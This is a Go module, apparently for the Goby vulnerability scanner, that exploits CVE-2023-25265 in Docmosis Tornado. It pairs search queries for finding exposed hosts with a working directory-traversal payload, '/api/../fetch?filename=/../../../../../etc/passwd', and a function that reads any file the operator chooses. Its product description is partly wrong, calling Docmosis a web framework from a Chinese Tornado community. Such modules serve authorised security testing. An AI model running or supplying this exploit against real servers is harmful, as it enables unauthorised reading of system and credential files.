package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Docmosis Tornado fetch file filename parameter file reading vulnerability (CVE-2023-25265)",
    "Description": "<p>Docmosis is a web framework and asynchronous network library developed by the Tornado community in China.</p><p>Docmosis Tornado versions before 2.9.5 have a security vulnerability. The vulnerability stems from a directory traversal vulnerability in com.docmosis.webserver.servlet.FetchTmp.doGet. Attackers can use authentication bypass vulnerabilities to read arbitrary files on the system and further control the system .</p>",
    "Product": "Docmosis-Tornado",
    "Homepage": "https://www.docmosis.com/",
    "DisclosureDate": "2023-02-08",
    "Author": "h1ei1",
    "FofaQuery": "body=\"WebServerDownload.css\" || body=\"Welcome to Docmosis Web Services\" || title=\"Docmosis Cloud Console\" || banner=\"Docmosis\" || header=\"Docmosis\"",
    "GobyQuery": "body=\"WebServerDownload.css\" || body=\"Welcome to Docmosis Web Services\" || title=\"Docmosis Cloud Console\" || banner=\"Docmosis\" || header=\"Docmosis\"",
    "Level": "2",
    "Impact": "<p>Docmosis Tornado versions before 2.9.5 have a security vulnerability. The vulnerability stems from a directory traversal vulnerability in com.docmosis.webserver.servlet.FetchTmp.doGet. Attackers can use authentication bypass vulnerabilities to read arbitrary files on the system and further control the system .</p>",
    "Recommendation": "<p>1, at present, the vendor has released the patches to repair loopholes, patch for a link: <a href=\"https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes.\">https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [
        "https://frycos.github.io/vulns4free/2023/01/24/0days-united-nations.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-25265"
    ],
    "CNNVD": [
        "CNNVD-202302-2303"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Docmosis Tornado fetch 文件 filename 参数文件读取漏洞（CVE-2023-25265）",
            "Product": "Docmosis-Tornado",
            "Description": "<p>Docmosis 是中国龙卷风科技（Tornado）社区的一个 Web 框架和异步网络库。<br></p><p>Docmosis Tornado 2.9.5之前版本存在安全漏洞，该漏洞源于 com.docmosis.webserver.servlet.FetchTmp.doGet&nbsp; 存在目录遍历漏洞，攻击者可配合身份验证绕过漏洞读取系统上任意文件，进一步控制系统。<br></p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes\">https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes</a>。<br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Docmosis Tornado 2.9.5 之前版本存在安全漏洞，该漏洞源于 com.docmosis.webserver.servlet.FetchTmp.doGet 存在目录遍历漏洞，攻击者可配合身份验证绕过漏洞读取系统上任意文件，进一步控制系统。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Docmosis Tornado fetch file filename parameter file reading vulnerability (CVE-2023-25265)",
            "Product": "Docmosis-Tornado",
            "Description": "<p>Docmosis is a web framework and asynchronous network library developed by the Tornado community in China.<br></p><p>Docmosis Tornado versions before 2.9.5 have a security vulnerability. The vulnerability stems from a directory traversal vulnerability in com.docmosis.webserver.servlet.FetchTmp.doGet. Attackers can use authentication bypass vulnerabilities to read arbitrary files on the system and further control the system .<br></p>",
            "Recommendation": "<p>1, at present, the vendor has released the patches to repair loopholes, patch for a link: <a href=\"https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes.\">https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Docmosis Tornado versions before 2.9.5 have a security vulnerability. The vulnerability stems from a directory traversal vulnerability in com.docmosis.webserver.servlet.FetchTmp.doGet. Attackers can use authentication bypass vulnerabilities to read arbitrary files on the system and further control the system .<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-22",
    "PocId": "10829"
}`

	sendPayloadsd845SC151 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(uri)
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadsd845SC151(hostInfo, `/api/../fetch?filename=/../../../../../etc/passwd`)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(stepLogs.Params["filePath"])
			uri := "/api/../fetch?filename=" + filePath
			resp, err := sendPayloadsd845SC151(expResult.HostInfo, uri)
			if err != nil {
				return expResult
			}
			if resp.StatusCode == 200 {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
				return expResult
			}
			return expResult
		},
	))
}
